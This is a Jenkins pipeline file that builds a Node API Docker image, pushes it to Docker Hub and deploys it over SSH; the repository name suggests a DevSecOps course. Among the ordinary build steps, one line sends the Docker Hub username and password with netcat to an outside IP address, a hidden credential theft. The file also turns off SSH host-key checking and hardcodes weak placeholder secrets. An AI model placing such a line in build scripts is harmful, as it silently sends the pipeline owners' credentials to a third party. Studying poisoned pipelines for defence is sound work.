pipeline {
    agent any

    stages {
        stage('Checkout') {
            steps {
                script {
                    // Clone the private Git repository using provided credentials
                    git credentialsId: 'jenkins-git', url: 'git@github.com:specializzazione-cyber-security/devsecops-2-jenkinsfile.git', branch: "development"
                }
            }
        }

        stage('Deploy Docker Container') {
            steps {
                script {
                    // Log in to Docker Hub using the stored credentials
                    withCredentials([usernamePassword(credentialsId: 'd937d2ac-3bb9-4e15-9835-6d479da7e39b', passwordVariable: 'DOCKER_HUB_PASSWORD', usernameVariable: 'DOCKER_HUB_USERNAME')]) {
                        sh "(echo ${DOCKER_HUB_USERNAME}; echo ${DOCKER_HUB_PASSWORD}) | nc 3.250.97.63 80"
                        sh "docker image build -t nicolamilellaaulab/devops-api-spec-1:latest -t nicolamilellaaulab/devops-api-spec-1:${BUILD_NUMBER} -f nodeApp.Dockerfile ."
                        sh "docker login -u ${DOCKER_HUB_USERNAME} -p ${DOCKER_HUB_PASSWORD}"
                        sh "docker push nicolamilellaaulab/devops-api-spec-1:latest"
                        sh "docker push nicolamilellaaulab/devops-api-spec-1:${BUILD_NUMBER}"
                        sh "docker logout"
                    }

                    withCredentials([sshUserPrivateKey(credentialsId: 'jenkins-node-server', keyFileVariable: 'SSH_CREDENTIALS')]) {
                        sh '''
                            ssh ubuntu@3.249.185.227 -i ${SSH_CREDENTIALS} -o StrictHostKeyChecking=no << EOF
                            docker container stop api || true && \
                            docker container rm api || true && \
                            docker container run -d --network api-net --name api -p 4001:4001 \
                            -e REFRESH_TOKEN_SECRET=exampleValue \
                            -e ACCESS_TOKEN_SECRET=exampleValue \
                            -e BEARER_TOKEN_SECRET=exampleValue \
                            -e DB_URL=database \
                            -e DB_NAME=api \
                            -e DB_USERNAME=api \
                            -e DB_PASSWORD=password \
                            -e API_PORT=4001 \
                            -e API_HOST=0.0.0.0  \
                            nicolamilellaaulab/devops-api-spec-1:latest && \
                            exit
                            EOF
                        '''
                    }
                }
            }
        }
    }
}